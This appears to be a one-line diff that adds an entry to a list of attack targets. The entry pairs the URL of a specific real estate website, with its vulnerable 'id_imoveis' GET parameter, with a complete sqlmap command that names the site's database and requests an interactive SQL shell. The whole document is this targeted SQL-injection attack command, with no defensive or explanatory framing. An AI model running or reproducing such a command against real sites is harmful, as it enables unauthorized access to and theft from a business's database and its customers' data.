@@ -1,0 +1,1 @@
+http://www.gapcorretoradeimoveis.com.br/imoveis_detalhes.php?id_imoveis=585 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.gapcorretoradeimoveis.com.br/imoveis_detalhes.php?id_imoveis=585 -D gapcorretorade --sql-shell
